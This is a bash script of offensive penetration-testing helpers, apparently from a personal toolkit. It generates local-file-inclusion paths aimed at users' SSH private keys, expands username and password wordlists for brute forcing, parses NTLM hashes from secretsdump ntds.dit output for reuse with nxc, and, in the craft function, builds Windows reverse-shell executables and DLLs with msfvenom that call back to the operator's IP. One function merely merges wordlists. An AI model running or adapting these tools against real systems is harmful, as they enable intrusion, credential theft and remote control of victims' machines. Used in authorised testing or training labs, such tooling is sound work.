#!/bin/bash


# TODO: Doc
# Description:
# Usage:
# Arguments:
# Example:
function create_payload() {
    [[ $1 == "-h" || $1 == "--help" ]] && _help && return 0

    desc_ssh_lfi="username => .ssh LFI"
    desc_extend_credential="credential wordlist => extend credential wordlist"
    local arg_mode=$(gum choose --header="Create what payload?" $desc_ssh_lfi $desc_extend_credential)

    case $arg_mode in
        "$desc_ssh_lfi") _ssh_lfi ;;
        "$desc_extend_credential") _extend_credential ;;
    esac
}

_ssh_lfi() {
    local input="$1"
    local prefix="$2"
    local algos=("id_rsa" "id_dsa" "id_ecdsa" "id_ed25519")

    # file mode
    if [[ -f "$input" ]]; then
        while IFS= read -r user; do
            for algo in "${algos[@]}"; do
                echo "${prefix}home/$user/.ssh/$algo"
            done
        done < "$input"
    else
        # single username
        for algo in "${algos[@]}"; do
            echo "${prefix}home/$input/.ssh/$algo"
        done
    fi
}

_extend_credential() {
    local username_file="${1:-$PWD/username.txt}"
    local password_file="${2:-$PWD/password.txt}"

    if [[ ! -f "$username_file" || ! -f "$password_file" ]]; then
        _logger error "[e]: Either username_file or password_file does not exist."
        return 1
    fi

    local tmp_user_file=$(mktemp)
    local tmp_pass_file=$(mktemp)

    while read -r username; do
        echo "$username" >> "$tmp_user_file"
        echo "$(echo "$username" | rev)" >> "$tmp_user_file"
        echo "$(echo "$username" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')" >> "$tmp_user_file"
    done < "$username_file"

    sort -u "$tmp_user_file" -o "$username_file"

    cp "$username_file" "$tmp_pass_file"
    echo "" >> "$tmp_pass_file"
    \cat "$password_file" >> "$tmp_pass_file"
    sort -u "$tmp_pass_file" -o "$password_file"
    rm -f "$tmp_user_file" "$tmp_pass_file"

    _logger info "[i] Extended username and password files."
}

function parse() {
    _passwd_parser() {
        input_file="$1"
        [[ -z "$input_file" ]] && echo "Error: No input file provided!" && return 1
        [[ ! -f "$input_file" ]] && echo "Error: Input file '$input_file' not found!" && return 1

        # Use `sed` to replace spaces between entries with newlines
        sed -E 's/ ([^:]+:x:[0-9]+:[0-9]+:)/\n\1/g' "$input_file" > format.passwd

        # Extract usernames (first field before ":") from the formatted data
        cut -d: -f1 format.passwd > format.passwd.users

        _logger info "[i] $(realpath format.passwd) (multi-line formatted output)"
        _logger info "[i] $(realpath format.passwd.users) (list of usernames)"
    }

    # parse secretdump output into username / hashes
    # combo with nxc
    _payload_secretdump() {
        local input_file="$1"
        local user_file="secretdump.user.txt"
        local hash_file="secretdump.hash.txt"

        echo -n "" > "$user_file"
        echo -n "" > "$hash_file"

        grep -A 1000 "\[*\] Reading and decrypting hashes from ntds.dit" "$input_file" | \
        grep -E "^[^:]+:[0-9]+:[0-9a-f]{32}:[0-9a-f]{32}" | \
        while IFS=: read -r username rid lmhash nthash rest; do
            echo "$username" >> "$user_file"
            echo "$lmhash:$nthash" >> "$hash_file"
        done

        _logger info "[i] Parsed usernames saved to $user_file"
        _logger info "[i] Parsed NTLM hashes saved to $hash_file"
    }
}

# Description: merge files into one file. Especially used for merging wordlists.
# Usage: merge <file1> <file2> ... [-o <output>] [-s <statistic>]
# Arguments:
#  -o|--output: Output file name (default: merged.txt)
#  -s|--statistic: greate a statistic of your merges (default: true)
# Example:
#   # To combine wordlists for subdomain enumeration:
#   merge /usr/share/wordlists/amass/subdomains-top1mil-110000.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
#         -o subdomain+vhost-default.txt
function merge() {
    local output="merged.txt"
    local statistic=true
    local files=()
    local total_lines=0

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -o|--output) output="$2" && shift 2 ;;
            -s|--statistic) statistic="$2" && shift 2 ;;
            *) files+=("$1") && shift ;;
        esac
    done

    [[ "${#files[@]}" -lt 2 ]] && _logger error "[e] At least two files to merge." && return 1

    for file in "${files[@]}"; do
        [[ ! -f "$file" ]] && _logger error "[e] File not found: $file" && return 1
    done

    local temp_output=$(mktemp)

    for file in "${files[@]}"; do
        total_lines=$((total_lines + $(wc -l < "$file")))
        sort -u "$file" >> "$temp_output"
    done

    sort -u "$temp_output" -o "$output"
    rm "$temp_output"

    local unique_lines=$(wc -l < "$output")
    local duplicates_removed=$((total_lines - unique_lines))

    if [[ "$statistic" == true ]]; then
        local stat_file="$output.statistic"
        {
            echo "Original filenames:"
            for file in "${files[@]}"; do
                echo "  - $file"
            done
            echo "Line counts per file:"
            for file in "${files[@]}"; do
                echo "  - $file: $(wc -l < "$file") lines"
            done
            echo "Total line count before merge: $total_lines"
            echo "Total line count after merge: $unique_lines"
            echo "Lines saved after merge (duplicates removed): $duplicates_removed"
        } > "$stat_file"
    fi

    _logger info "[i] Files merged into $output"
    [[ "$statistic" == true ]] && _logger info "[i] Statistics saved to $stat_file"
}

# Description: Generate a reverse shell payload using msfvenom
# Usage: craft [-p PORT] [-a ARCH] [-i IP]
# Arguments:
#   - PORT: Port number for the reverse shell. (Default: see Configuration)
#   - ARCH: Architecture for the reverse shell (x86, x64, dll). (Default: see Configuration)
#   - IP: IP address for the reverse shell. (Default: see Configuration)
# Configuration:
#   - functions.craft.default_port: default LPORT you like.
#   - functions.craft.default_arch: default ARCH you like.
#   - functions.craft.generate_stage: create stage payloads. (can use concurrently with stageless)
#   - functions.craft.generate_stageless: create stageless payloads. (can use concurrently with stage)
# Example:
#   craft
#   craft -p 4444 -a x86
#   craft -i 192.168.1.1 -a x64
# References:
#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
# TODO: extends to Linux
function craft() {
    [[ $1 == "-h" || $1 == "--help" ]] && _help && return 0
    local ip=$(_get_default_network_interface_ip)
    _logger -l info "Using IP: $ip"
    _logger -l warn "craft only support Windows for now."
    local arg_port=$(gum input --header="Port used?" --placeholder="Port used?" --value="$_swiss_craft_default_port")
    local arg_arch=$(gum choose --header "Arch?" "x86" "x64" "dll")
    local arg_stage=$(gum choose --header "Stage/Stageless?" "stage" "stageless")

    local payload
    local file_type

    case $arg_arch in
        x86)
            [[ $arg_stage = "stage" ]] && payload="windows/shell/reverse_tcp"
            [[ $arg_stage = "stageless" ]] && payload="windows/shell/reverse_tcp"
            file_type="exe"
        ;;
        x64)
            [[ $arg_stage = "stage" ]] && payload="windows/shell/reverse_tcp"
            [[ $arg_stage = "stageless" ]] && payload="windows/x64/shell_reverse_tcp"
            file_type="exe"
        ;;
        dll)
            payload="windows/shell_reverse_tcp" && file_type="dll"
        ;;
    esac

    _wrap msfvenom -p $payload LHOST=$ip LPORT=$arg_port -f $file_type -o reverse-$arg_stage-$arg_port.$file_type
}